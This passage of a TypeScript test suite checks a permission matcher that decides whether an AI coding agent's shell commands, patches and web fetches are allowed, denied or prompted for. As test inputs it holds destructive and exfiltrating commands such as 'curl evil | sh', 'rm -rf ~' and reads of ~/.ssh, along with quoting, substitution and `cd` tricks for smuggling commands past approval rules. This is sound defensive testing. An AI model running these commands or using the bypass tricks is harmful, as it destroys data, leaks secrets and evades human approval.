        ['rm \\  -rf x', 'rm \\ -rf x'],
        ['find . -delete \\ ', 'find . -delete'],
        ['find . -delete \\\t', 'find . -delete'],
        ['find . -delete \\ ', 'find . -delete \\'], // bash drops a trailing lone backslash
        ["find . -delete ' '", 'find . -delete'],
        ['find . -delete ', 'find . -delete'],
        ['find . -delete\r', 'find . -delete'],
        ['rm -rf x', 'rm -rf x']
      ]
      for (const [approved, other] of pairs) {
        const exact: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: approved, exact: true }]
        expect(matchRule(exact, 'run_shell', approved)).toBe('allow')
        expect(matchRule(exact, 'run_shell', other)).toBeNull()
        expect(matchRule([allow('run_shell', approved)], 'run_shell', other)).toBeNull()
        expect(matchRule([{ action: 'allow', tool: 'run_shell', match: other, exact: true }], 'run_shell', approved)).toBeNull()
      }
      // Unquoted blanks still fold, however many there are and wherever they sit.
      for (const cmd of ['git status', 'git   status -s', '\tgit\tstatus', '  git status  ', 'git status\t-s']) {
        expect(matchRule([allow('run_shell', 'git  status')], 'run_shell', cmd)).toBe('allow')
        expect(matchRule([allow('run_shell', ' git\tstatus ')], 'run_shell', cmd)).toBe('allow')
      }
      const file: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: "rm 'my  file'", exact: true }]
      for (const cmd of ["  rm   'my  file'  ", "rm\t'my  file'", 'rm "my  file"', 'rm my\\ \\ file']) {
        expect(matchRule(file, 'run_shell', cmd)).toBe('allow')
      }
      // A deny or ask still folds all whitespace, so it fires on each of these.
      expect(matchRule([deny('run_shell', 'find . -delete')], 'run_shell', 'find . -delete \\ ')).toBe('deny')
      expect(matchRule([deny('run_shell', "rm 'my file'")], 'run_shell', "rm 'my  file'")).toBe('deny')
      expect(matchRule([deny('run_shell', 'rm -rf*')], 'run_shell', 'rm \\  -rf x')).toBe('deny')
      expect(matchRule([{ action: 'ask', tool: 'run_shell', match: 'rm -rf x' }], 'run_shell', 'rm -rf x')).toBe('ask')
    })

    it("an allow reads `$'...'` like other quoting: a decoded `*` or `~` is never the bare one", () => {
      const pairs: [string, string][] = [
        ["rm $'*'", 'rm *'],
        ["rm $'\\x2a'", 'rm *'],
        ["rm -rf $'~'", 'rm -rf ~'],
        ["rm -rf $'\\176'", 'rm -rf ~'],
        ["rm -rf $'build\\x20~'", 'rm -rf build ~'],
        ["echo $'a\\x3e' ~/.bashrc", 'echo a> ~/.bashrc'],
        // `$$` is the PID, so this is the PID then `HOME`, not `$HOME`.
        ["echo $$'HOME'", 'echo $HOME'],
        // `$"..."` can be translated into other text when it runs, so it reads as itself.
        ['echo $"HOME"', 'echo $HOME'],
        ['echo $"x"', 'echo "x"']
      ]
      for (const [approved, other] of pairs) {
        const exact: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: approved, exact: true }]
        expect(matchRule(exact, 'run_shell', approved)).toBe('allow')
        expect(matchRule(exact, 'run_shell', other)).toBeNull()
        expect(matchRule([{ action: 'allow', tool: 'run_shell', match: other, exact: true }], 'run_shell', approved)).toBeNull()
      }
      const tilde: PermissionRule[] = [allow('run_shell', "rm -rf $'~'")]
      expect(matchRule(tilde, 'run_shell', 'rm -rf ~')).toBeNull()
      expect(matchRule(tilde, 'run_shell', "rm -rf '~' x")).toBe('allow')
    })

    it("an allow's own `*` is still a wildcard, quoted or not, over quoted text too", () => {
      const allowEcho: PermissionRule[] = [allow('run_shell', 'echo *')]
      for (const cmd of ["echo '*'", 'echo "a b"', 'echo ~', "echo 'a > b'"]) {
        expect(matchRule(allowEcho, 'run_shell', cmd)).toBe('allow')
      }
      expect(matchRule([allow('run_shell', "ls '*'")], 'run_shell', 'ls src')).toBe('allow')
      expect(matchRule([allow('run_shell', 'ls *.ts')], 'run_shell', "ls 'a b.ts'")).toBe('allow')
      expect(matchRule([allow('run_shell', 'ls *.ts')], 'run_shell', 'ls a.js')).toBeNull()
    })

    it("an allow's wildcard cannot end inside a quoted character", () => {
      // `echo *'>x'` allows echo of anything ending in a literal `>x`. In `echo '\'>x` the
      // `\` is literal but the `>` redirects; a wildcard that could stop between a
      // literal backslash and its marker would read that `>` as the quoted one.
      const rules: PermissionRule[] = [allow('run_shell', "echo *'>x'")]
      expect(matchRule(rules, 'run_shell', "echo a'>x'")).toBe('allow')
      expect(matchRule(rules, 'run_shell', `echo '\\'>x`)).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo \\\\>x')).toBeNull()
    })
  })

  it('prefix-matches a bare command pattern', () => {
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: 'npm test' }], 'run_shell', 'npm test -- --watch')).toBe('allow')
  })

  it('* matches anything for the tool, but an empty pattern is inert (matches nothing)', () => {
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '*' }], 'write_file', 'anything.ts')).toBe('ask')
    // A blank match must NOT silently apply to every call — the rule falls through
    // (null) so the approval policy decides, rather than auto-allowing/denying all.
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '' }], 'write_file', 'anything.ts')).toBeNull()
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: '' }], 'run_shell', 'rm -rf /')).toBeNull()
  })

  describe('run_shell chained-command safety', () => {
    const allowGitStatus: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git status*' }]

    it('does NOT auto-approve an unapproved command chained onto an allowed one', () => {
      // The core bug: `git status*` must not allow-list a smuggled second command.
      expect(matchRule(allowGitStatus, 'run_shell', 'git status && curl evil | sh')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status; rm -rf ~')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status | tee /tmp/x')).toBeNull()
    })

    it('still allows a chain when every sub-command is allowed', () => {
      const allowGit: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git *' }]
      expect(matchRule(allowGit, 'run_shell', 'git status && git push')).toBe('allow')
    })

    it('treats an in-workspace `cd` prelude as non-gating so a generalized rule covers the chain', () => {
      const allowNpm: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'npm install' }]
      const roots = ['/repo']
      // The `cd /repo` (unmatched, in-workspace) must not block the allow of the real command.
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo && npm install lodash', roots)).toBe('allow')
      // A command that is ONLY a directory change still falls through to the policy.
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo', roots)).toBeNull()
      // A non-cd unmatched sub-command still blocks (no smuggling past the prelude).
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo && npm install && curl evil | sh', roots)).toBeNull()
    })

    it('a workspace-ESCAPING `cd` stays gated (does not slip past on an allowed command)', () => {
      const allowCat: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'cat config' }]
      // `cd ~/.ssh` escapes /repo, so the chain is not auto-approved despite `cat config` being allowed.
      expect(matchRule(allowCat, 'run_shell', 'cd ~/.ssh && cat config', ['/repo'])).toBeNull()
    })

    it('keeps a `cd` gated when bash takes its target from anywhere but its words', () => {
      const rules = [allow('run_shell', 'cat config'), allow('run_shell', 'cat .ssh/config'), allow('run_shell', 'echo')]
      const roots = ['/work/project']
      for (const cmd of [
        // No target: `cd` goes to $HOME, `pushd`/`popd` to the directory stack, so a
        // relative path after them is not under the workspace.
        'cd && cd .ssh && cat config',
        'cd -- && cat .ssh/config',
        'cd -L && cat .ssh/config',
        'pushd && cat config',
        'popd && cat config',
        'pushd +1 && cat config',
        'popd -n && cat config',
        // `-` is $OLDPWD; `~+`, `~-`, and `~user` are $PWD, $OLDPWD, and another home.
        'cd - && cat config',
        'cd -- - && cat config',
        'cd ~+/.. && cat config',
        'cd ~- && cat config',
        'cd ~root && cat config',
        // An expansion: `$PWD/..` climbs, though it reads as a relative path that doesn't.
        'cd $PWD/.. && cat config',
        'cd ${PWD}/.. && cat config',
        'cd "$DIR" && cat config',
        // A substitution's output is never scanned (its body is a segment of its own).
        'cd "$(echo ~/.ssh)" && cat config',
        'cd "`echo ~/.ssh`" && cat config',
        'cd $(echo ~/.ssh) && cat config',
        // One glued to the target leaves no blank once its body is lifted out (`cd .ssh`).
        'cd $(echo ~/).ssh && cat config',
        'cd `echo ~/`.ssh && cat config',
        'cd .ssh$(echo /../..) && cat config',
        'cd /work/project$(echo /../..) && cat config',
        'echo $(cd $(echo ~/).ssh && cat config)',
        // A glob or brace that expands to `..`.
        'cd .[.] && cat config',
        'cd {..,} && cat config',
        'cd {..,}/{..,}/etc && cat config',
        // `#` starts a comment, so this is a bare `cd`, and `cat` runs in $HOME.
        'cd #\ncat .ssh/config',
        // A second argument or a redirection is more than a change of directory.
        'cd src extra && cat config',
        'cd src > notes.txt && cat config'
      ]) {
        expect(matchRule(rules, 'run_shell', cmd, roots), cmd).toBeNull()
      }
    })

    it('still skips a `cd` or `pushd` into the workspace that names its target', () => {
      const allowStatus = [allow('run_shell', 'git status')]
      const roots = ['/work/project']
      for (const cmd of [
        'cd src && git status',
        'cd . && git status',
        'cd -- src && git status',
        'cd -P /work/project && git status',
        'cd -L src/../lib && git status',
        'pushd src && git status',
        'pushd -- /work/project/src && git status'
      ]) {
        expect(matchRule(allowStatus, 'run_shell', cmd, roots), cmd).toBe('allow')
      }
      // A substitution elsewhere in the command leaves the `cd` segment alone.
      const allowCommit = [...allowStatus, allow('run_shell', 'git commit'), allow('run_shell', 'cat msg.txt')]
      expect(matchRule(allowCommit, 'run_shell', 'cd src && git commit -m "$(cat msg.txt)"', roots)).toBe('allow')
    })

    it('keeps a relative `cd` gated while CDPATH is set, since bash looks there first', () => {
      const allowCat = [allow('run_shell', 'cat config')]
      const roots = ['/work/project']
      vi.stubEnv('CDPATH', homedir())
      expect(matchRule(allowCat, 'run_shell', 'cd .ssh && cat config', roots)).toBeNull()
      expect(matchRule(allowCat, 'run_shell', 'pushd .ssh && cat config', roots)).toBeNull()
      // A name led by `/`, `./`, or `../` (or `.` itself) is never looked up there.
      for (const cmd of ['cd ./.ssh && cat config', 'cd . && cat config', 'cd /work/project/x && cat config']) {
        expect(matchRule(allowCat, 'run_shell', cmd, roots), cmd).toBe('allow')
      }
      vi.stubEnv('CDPATH', '')
      expect(matchRule(allowCat, 'run_shell', 'cd .ssh && cat config', roots)).toBe('allow')
    })

    it('reads a segment\'s program as bash does, so `"cd"k` is not skipped as a `cd`', () => {
      const allowStatus = [allow('run_shell', 'git status')]
      const roots = ['/work/project']
      // Bash joins `"cd"k` into the one word `cdk`, which runs a program.
      for (const cmd of ['git status && "cd"k deploy', "git status && 'cd'k deploy", 'git status && cdk deploy']) {
        expect(matchRule(allowStatus, 'run_shell', cmd, roots)).toBeNull()
      }
      // A quoted or escaped `cd` is still the builtin, and still plumbing inside the workspace.
      for (const cmd of ['git status && "cd" /work/project', 'git status && \\cd src', "git status && $'cd' src"]) {
        expect(matchRule(allowStatus, 'run_shell', cmd, roots)).toBe('allow')
      }
    })

    it('keeps a quoted or escaped `cd` out of the workspace gated', () => {
      const allowStatus = [allow('run_shell', 'git status')]
      const roots = ['/work/project']
      for (const cmd of [
        'cd /etc && git status',
        "cd $'/etc' && git status",
        "cd $'\\x2fetc' && git status",
        'cd $"/etc" && git status',
        'cd \\/etc && git status'
      ]) {
        expect(matchRule(allowStatus, 'run_shell', cmd, roots)).toBeNull()
      }
      expect(matchRule(allowStatus, 'run_shell', "cd $'/work/project' && git status", roots)).toBe('allow')
    })

    it('still denies a `cd` chain when a sub-command is denied', () => {
      expect(matchRule(rules, 'run_shell', 'cd /repo && rm -rf ~', ['/repo'])).toBe('deny')
    })

    it('denies when any sub-command matches a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'git status && rm -rf ~')).toBe('deny')
    })

    it('inspects command-substitution bodies, not just the outer command', () => {
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf /)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo `rm -rf /tmp/x`')).toBe('deny')
    })

    it('does not let a paren inside a $(...) body hide a command from a narrow allow rule', () => {
      // A literal `(` in the substitution body used to defeat the extraction regex,
      // leaving `echo $(rm -rf ... "()")` matching `echo *` and auto-approving `rm`.
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf ~/x "()")')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo $(rm -rf /tmp/x "()")')).toBe('deny')
    })

    it('inspects process-substitution bodies (<(...) and >(...))', () => {
      const allowDiff: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'diff *' }]
      expect(matchRule(allowDiff, 'run_shell', 'diff <(ls) <(rm -rf x)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'diff <(ls) <(rm -rf /tmp/x)')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'tee >(rm -rf /tmp/x)')).toBe('deny')
    })

    it('inspects nested substitution bodies', () => {
      expect(matchRule(rules, 'run_shell', 'echo $(echo $(rm -rf /tmp/x))')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'cat <(diff <(rm -rf /tmp/x) <(ls))')).toBe('deny')
    })

    it('normalizes whitespace so spacing tricks cannot dodge a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'rm    -rf   /tmp/x')).toBe('deny')
    })
  })
})

/** A patch envelope from per-op header lines (bodies filled in per op). */
function patchOf(...ops: string[][]): string {
  return ['*** Begin Patch', ...ops.flat(), '*** End Patch'].join('\n')
}
const addOp = (path: string): string[] => [`*** Add File: ${path}`, '+x']
const updateOp = (path: string, moveTo?: string): string[] => [
  `*** Update File: ${path}`,
  ...(moveTo ? [`*** Move to: ${moveTo}`] : []),
  '@@',
  '-a',
  '+b'
]
const deleteOp = (path: string): string[] => [`*** Delete File: ${path}`]

describe('apply_patch files and rules', () => {
  const ROOTS = ['/work/project']
  const denySecrets: PermissionRule[] = [deny('*', 'secrets/*')]
  const files = (patch: string): string[] => patchSubjectPaths(permissionSubject('apply_patch', { patch }))
  const matchPatch = (rules: PermissionRule[], patch: string): PermissionRule['action'] | null =>
    matchRule(rules, 'apply_patch', permissionSubject('apply_patch', { patch }), ROOTS)

  it('lists every file an apply_patch touches, both ends of a move included, once each', () => {
    const patch = patchOf(
      addOp('added.txt'),
      updateOp('changed.txt'),
      updateOp('from.txt', 'to/moved.txt'),
      deleteOp('gone.txt'),
      updateOp('added.txt')
    )
    expect(files(patch)).toEqual(['added.txt', 'changed.txt', 'from.txt', 'to/moved.txt', 'gone.txt'])
  })

  it('reads the paths of a unified diff too', () => {
    const patch = ['--- /dev/null', '+++ b/secrets/new.txt', '@@ -0,0 +1 @@', '+x'].join('\n')
    expect(files(patch)).toEqual(['secrets/new.txt'])
  })

  it('names no file for a patch that does not parse', () => {
    expect(files('not a patch')).toEqual([])
    expect(permissionSubject('apply_patch', {})).toBe('')
  })

  it('denies a patch when any one file is denied, whatever allows the rest', () => {
    const rules: PermissionRule[] = [...denySecrets, allow('apply_patch', '*')]
    expect(matchPatch(rules, patchOf(addOp('src/ok.ts'), updateOp('secrets/keys.txt')))).toBe('deny')
  })

  it('denies an update, a delete, a move out of, and a move into a denied directory', () => {
    for (const ops of [updateOp('secrets/a.txt'), deleteOp('secrets/a.txt'), updateOp('secrets/a.txt', 'a.txt'), updateOp('a.txt', 'secrets/a.txt')]) {
      expect(matchPatch(denySecrets, patchOf(ops))).toBe('deny')
    }
  })

  it('asks when any file asks, even if every other file is allowed', () => {
    const rules: PermissionRule[] = [{ action: 'ask', tool: 'apply_patch', match: 'prod/*' }, allow('*', '*')]
    expect(matchPatch(rules, patchOf(addOp('src/a.ts'), updateOp('prod/deploy.ts')))).toBe('ask')
  })

  it('allows only when every file is allowed', () => {
    const rules: PermissionRule[] = [allow('apply_patch', 'src/*')]
    expect(matchPatch(rules, patchOf(addOp('src/a.ts'), updateOp('src/b.ts')))).toBe('allow')
    // One file outside the allow falls back to the policy, which prompts for it.
    expect(matchPatch(rules, patchOf(addOp('src/a.ts'), addOp('docs/b.md')))).toBeNull()
  })

  it('canonicalizes each patch path, so a respelled or absolute path cannot dodge a deny', () => {
    for (const p of ['src/../secrets/x.txt', '/work/project/secrets/x.txt', './secrets/x.txt']) {
      expect(matchPatch(denySecrets, patchOf(addOp(p)))).toBe('deny')
    }
  })

  it('matches a patch that names no file as the empty subject (only a match-all rule)', () => {
    expect(matchPatch(denySecrets, 'not a patch')).toBeNull()
    expect(matchPatch([deny('apply_patch', '*')], 'not a patch')).toBe('deny')
  })
})

describe('persistedRules', () => {
  const exactAllow = (tool: string, match: string): PermissionRule => ({ action: 'allow', tool, match, exact: true })

  it('stores one rule per file an apply_patch touches: exact for allow, a glob for deny', () => {
    const patch = patchOf(addOp('a.txt'), updateOp('b.txt', 'c/b.txt'))
    expect(persistedRules('allow', 'apply_patch', { patch })).toEqual([
      exactAllow('apply_patch', 'a.txt'),
      exactAllow('apply_patch', 'b.txt'),
      exactAllow('apply_patch', 'c/b.txt')
    ])
    expect(persistedRules('deny', 'apply_patch', { patch })).toEqual([
      deny('apply_patch', 'a.txt'),
      deny('apply_patch', 'b.txt'),
      deny('apply_patch', 'c/b.txt')
    ])
  })

  it('never stores a match-all rule for a patch that names no file', () => {
    expect(persistedRules('allow', 'apply_patch', { patch: 'not a patch' })).toEqual([])
    expect(persistedRules('deny', 'apply_patch', {})).toEqual([])
  })

  it('generalizes a shell allow but keeps a shell deny as typed (neither exact)', () => {
    expect(persistedRules('allow', 'run_shell', { command: 'cd /repo && npm install lodash' })).toEqual([
      allow('run_shell', 'npm install')
    ])
    expect(persistedRules('deny', 'run_shell', { command: 'npm install lodash' })).toEqual([
      deny('run_shell', 'npm install lodash')
    ])
  })

  it('saves a shell sub-command kept verbatim exact when it holds `*`', () => {
    expect(persistedRules('allow', 'run_shell', { command: 'rm *' })).toEqual([exactAllow('run_shell', 'rm *')])
    expect(persistedRules('allow', 'run_shell', { command: 'cd /repo && rm -f *.log && git add * && ls -la' })).toEqual([
      exactAllow('run_shell', 'rm -f *.log'),
      allow('run_shell', 'git add'),
      allow('run_shell', 'ls -la')
    ])
    expect(persistedRules('allow', 'run_shell', { command: './*.sh run x' })).toEqual([
      exactAllow('run_shell', './*.sh run x')
    ])
    // A deny stays a glob: it can only be broader than the call it blocked.
    expect(persistedRules('deny', 'run_shell', { command: 'rm *' })).toEqual([deny('run_shell', 'rm *')])
  })

  it('saves a directory change the gate would prompt for, exact', () => {
    // As a prefix, `cd` would cover every directory change.
    expect(persistedRules('allow', 'run_shell', { command: 'cd && make' })).toEqual([
      exactAllow('run_shell', 'cd'),
      allow('run_shell', 'make')
    ])
    expect(persistedRules('allow', 'run_shell', { command: 'pushd src && make && popd' })).toEqual([
      allow('run_shell', 'make'),
      exactAllow('run_shell', 'popd')
    ])
    // Given the run's roots, a `cd` out of them is saved too; one into them is dropped.
    expect(
      persistedRules('allow', 'run_shell', { command: 'cd ~/.ssh && cat config' }, ['/work/project'])
    ).toEqual([exactAllow('run_shell', 'cd ~/.ssh'), allow('run_shell', 'cat config')])
    expect(
      persistedRules('allow', 'run_shell', { command: 'cd /work/project && cat config' }, ['/work/project'])
    ).toEqual([allow('run_shell', 'cat config')])
  })

  it('stores an exact allow for the subject, or `*` for a tool whose calls carry none', () => {
    expect(persistedRules('allow', 'write_file', { path: 'notes.txt', content: '' })).toEqual([
      exactAllow('write_file', 'notes.txt')
    ])
    expect(persistedRules('allow', 'web_fetch', { url: 'https://x.com/a' })).toEqual([
      exactAllow('web_fetch', 'https://x.com/a')
    ])
    expect(persistedRules('allow', 'dispatch_writable_agent', { prompt: 'go' })).toEqual([
      allow('dispatch_writable_agent', '*')
    ])
  })

  it('stores no allow for a call that passes its subject blank (it used to save `*`)', () => {
    expect(persistedRules('allow', 'write_file', { path: '', content: 'x' })).toEqual([])
    expect(persistedRules('allow', 'edit_file', { path: '  ' })).toEqual([])
    expect(persistedRules('allow', 'run_shell', { command: ' ' })).toEqual([])
    expect(persistedRules('allow', 'web_fetch', { url: '' })).toEqual([])
    // A deny may stay broad: it can only tighten.
    expect(persistedRules('deny', 'write_file', { path: '', content: 'x' })).toEqual([deny('write_file', '*')])
  })
})

describe('a saved "Always allow" covers only the approved target', () => {
  const ROOTS = ['/work/project']
  const saved = (tool: string, args: Record<string, unknown>): PermissionRule[] =>
    persistedRules('allow', tool, args, ROOTS)

  it.each(['write_file', 'edit_file', 'multi_edit', 'notebook_edit'])(
    '%s: a path named `*` allows only that file, not every path',
    (tool) => {
      const rules = saved(tool, { path: '*' })
      expect(rules).toEqual([{ action: 'allow', tool, match: '*', exact: true }])
      expect(matchRule(rules, tool, '*', ROOTS)).toBe('allow')
      expect(matchRule(rules, tool, 'src/index.ts', ROOTS)).toBeNull()
      expect(matchRule(rules, tool, '/etc/passwd', ROOTS)).toBeNull()
      expect(matchRule(rules, tool, '~/.ssh/authorized_keys', ROOTS)).toBeNull()
    }
  )

  it('a path holding `*` is not a glob: `x*` allows the file `x*` only', () => {
    const rules = saved('write_file', { path: 'x*' })
    expect(matchRule(rules, 'write_file', 'x*', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'write_file', 'xyz', ROOTS)).toBeNull()
    expect(matchRule(rules, 'write_file', 'xyz/deep.ts', ROOTS)).toBeNull()
    expect(matchRule(saved('write_file', { path: 'src/*.ts' }), 'write_file', 'src/a.ts', ROOTS)).toBeNull()
  })

  it('a directory path allows that path only, not the files under it', () => {
    const rules = saved('write_file', { path: 'src' })
    expect(matchRule(rules, 'write_file', 'src', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'write_file', 'src/deep/file', ROOTS)).toBeNull()
    expect(matchRule(rules, 'write_file', 'src/a.ts', ROOTS)).toBeNull()
    expect(matchRule(rules, 'write_file', 'srcx', ROOTS)).toBeNull()
  })

  it('still matches the same file however it is spelled, and nothing it climbs to', () => {
    const rules = saved('write_file', { path: 'src/a.ts' })
    expect(matchRule(rules, 'write_file', '/work/project/src/a.ts', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'write_file', './src/./a.ts', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'write_file', 'src/b/../a.ts', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'write_file', 'src/a.ts/../b.ts', ROOTS)).toBeNull()
    expect(matchRule(saved('write_file', { path: 'src/../../etc/passwd' }), 'write_file', 'src/x', ROOTS)).toBeNull()
  })

  it('anchors a relative exact path to each root, like a glob rule', () => {
    const roots = ['/work/project', '/work/other']
    const rules = saved('write_file', { path: 'a.ts' })
    expect(matchRule(rules, 'write_file', '/work/other/a.ts', roots)).toBe('allow')
    expect(matchRule(rules, 'write_file', '/work/other/b.ts', roots)).toBeNull()
  })

  it('apply_patch: a patch touching `*` or a directory saves rules for those paths only', () => {
    const rules = saved('apply_patch', { patch: patchOf(addOp('*'), addOp('src')) })
    expect(rules.every((r) => r.exact)).toBe(true)
    expect(matchRule(rules, 'apply_patch', permissionSubject('apply_patch', { patch: patchOf(addOp('*'), addOp('src')) }), ROOTS)).toBe('allow')
    expect(matchRule(rules, 'apply_patch', permissionSubject('apply_patch', { patch: patchOf(addOp('other.ts')) }), ROOTS)).toBeNull()
    expect(matchRule(rules, 'apply_patch', permissionSubject('apply_patch', { patch: patchOf(updateOp('src/deep.ts')) }), ROOTS)).toBeNull()
    expect(matchRule(rules, 'apply_patch', permissionSubject('apply_patch', { patch: patchOf(addOp('*'), addOp('/etc/x')) }), ROOTS)).toBeNull()
  })

  it('web_fetch and web_search: a `*` in the URL or query is literal', () => {
    const fetch = saved('web_fetch', { url: 'https://Evil.example/*' })
    expect(matchRule(fetch, 'web_fetch', 'https://evil.example/*', ROOTS)).toBe('allow')
    expect(matchRule(fetch, 'web_fetch', 'https://evil.example/exfil?d=1', ROOTS)).toBeNull()
    expect(matchRule(saved('web_fetch', { url: 'https://x.example/a' }), 'web_fetch', 'https://x.example/a/b', ROOTS)).toBeNull()
    const search = saved('web_search', { query: '*' })
    expect(matchRule(search, 'web_search', '*', ROOTS)).toBe('allow')
    expect(matchRule(search, 'web_search', 'anything else', ROOTS)).toBeNull()
  })

  it('run_shell: a `*` in an approved command is literal, so `rm *` does not allow `rm -rf ~`', () => {
    const rm = saved('run_shell', { command: 'rm *' })
    expect(matchRule(rm, 'run_shell', 'rm *', ROOTS)).toBe('allow')
    for (const cmd of ['rm -rf ~', 'rm -rf *', 'rm * ~', 'rm -rf / *', 'rm x && rm *']) {
      expect(matchRule(rm, 'run_shell', cmd, ROOTS)).toBeNull()
    }
    const find = saved('run_shell', { command: 'find . -name "*.ts"' })
    expect(matchRule(find, 'run_shell', "find . -name '*.ts'", ROOTS)).toBe('allow')
    expect(matchRule(find, 'run_shell', 'find . -name x -delete -name y.ts', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: 'ls *.ts' }), 'run_shell', 'ls ~/.ssh/id_rsa.ts', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: './*.sh run' }), 'run_shell', './evil.sh run', ROOTS)).toBeNull()
  })

  it('run_shell: a quoted `*` or `~` in an approved command is not the bare one', () => {
    const star = saved('run_shell', { command: "rm '*'" })
    expect(star).toEqual([{ action: 'allow', tool: 'run_shell', match: "rm '*'", exact: true }])
    expect(matchRule(star, 'run_shell', 'rm "*"', ROOTS)).toBe('allow')
    expect(matchRule(star, 'run_shell', 'rm *', ROOTS)).toBeNull()
    const tilde = saved('run_shell', { command: "rm -rf '~'" })
    expect(tilde).toEqual([{ action: 'allow', tool: 'run_shell', match: "rm -rf '~'" }])
    expect(matchRule(tilde, 'run_shell', 'rm -rf ~', ROOTS)).toBeNull()
    expect(matchRule(tilde, 'run_shell', 'rm -rf ~/.ssh', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: "rm -rf 'build ~'" }), 'run_shell', 'rm -rf build ~', ROOTS)).toBeNull()
    // A quoted program is not saved bare, which would name a different program.
    const tool = saved('run_shell', { command: "'~/bin/tool' status" })
    expect(matchRule(tool, 'run_shell', '~/bin/tool status', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: '"my tool" status' }), 'run_shell', 'my tool status', ROOTS)).toBeNull()
  })

  it("run_shell: a `*` spelled by a `$'...'` escape is literal too, and saved exact", () => {
    const rm = saved('run_shell', { command: "rm $'\\x2a'" })
    expect(rm).toEqual([{ action: 'allow', tool: 'run_shell', match: "rm $'\\x2a'", exact: true }])
    expect(matchRule(rm, 'run_shell', "rm '*'", ROOTS)).toBe('allow')
    for (const cmd of ['rm *', 'rm -rf ~', 'rm -rf *']) {
      expect(matchRule(rm, 'run_shell', cmd, ROOTS)).toBeNull()
    }
    // A program it spells with `*` is not generalized to a glob over other programs.
    const prog = saved('run_shell', { command: "./$'\\x2a'.sh run" })
    expect(prog[0]?.exact).toBe(true)
    expect(matchRule(prog, 'run_shell', './evil.sh run', ROOTS)).toBeNull()
    const tilde = saved('run_shell', { command: "rm -rf $'\\x7e'" })
    expect(matchRule(tilde, 'run_shell', 'rm -rf ~', ROOTS)).toBeNull()
    expect(matchRule(tilde, 'run_shell', 'rm -rf ~/.ssh', ROOTS)).toBeNull()
  })

  it('run_shell: approving a command with an empty quoted word does not allow it without one', () => {
    // `'' rm -rf /` runs nothing, so it looks harmless to approve; its rule must not cover `rm -rf /`.
    const noop = saved('run_shell', { command: "'' rm -rf /" })
    expect(noop).toEqual([{ action: 'allow', tool: 'run_shell', match: "'' rm -rf /" }])
    expect(matchRule(noop, 'run_shell', "'' rm -rf /", ROOTS)).toBe('allow')
    for (const cmd of ['rm -rf /', 'rm -rf / x', '"rm" -rf /', 'cd /work/project && rm -rf /']) {
      expect(matchRule(noop, 'run_shell', cmd, ROOTS)).toBeNull()
    }
    // In a chain the empty-led sub-command keeps its own verbatim rule.
    const chained = saved('run_shell', { command: "'' rm -rf / && git status" })
    expect(chained.map((r) => r.match)).toEqual(["'' rm -rf /", 'git status'])
    expect(matchRule(chained, 'run_shell', 'rm -rf / && git status', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: "rm '' -rf x" }), 'run_shell', 'rm -rf x', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: "find . -delete ''" }), 'run_shell', 'find . -delete', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: "ls '" }), 'run_shell', 'ls -la ~/.ssh', ROOTS)).toBeNull()
  })

  it('run_shell: approving a command saves its quoted and escaped whitespace as written', () => {
    // bash passes find a lone " " here, so it errors and deletes nothing; its rule must
    // not allow `find . -delete`, nor that spelled with a trailing backslash bash drops.
    const noop = saved('run_shell', { command: 'find . -delete \\ ' })
    expect(noop).toEqual([{ action: 'allow', tool: 'run_shell', match: 'find . -delete \\ ' }])
    expect(matchRule(noop, 'run_shell', 'find . -delete \\ ', ROOTS)).toBe('allow')
    for (const cmd of ['find . -delete', 'find . -delete \\', 'find . -delete x', 'cd /work/project && find . -delete']) {
      expect(matchRule(noop, 'run_shell', cmd, ROOTS)).toBeNull()
    }
    // Only unquoted blanks collapse in the saved rule.
    const file = saved('run_shell', { command: "rm   'my  file'" })
    expect(file.map((r) => r.match)).toEqual(["rm 'my  file'"])
    expect(matchRule(file, 'run_shell', "rm 'my file'", ROOTS)).toBeNull()
    // `rm \ -rf x` removes " -rf" and x; `rm \  -rf x` removes " " and x, recursively.
    expect(matchRule(saved('run_shell', { command: 'rm \\ -rf x' }), 'run_shell', 'rm \\  -rf x', ROOTS)).toBeNull()
    expect(matchRule(saved('run_shell', { command: 'rm \\  -rf x' }), 'run_shell', 'rm \\ -rf x', ROOTS)).toBeNull()
    // A no-break space is part of the word to bash, so it is kept, never trimmed.
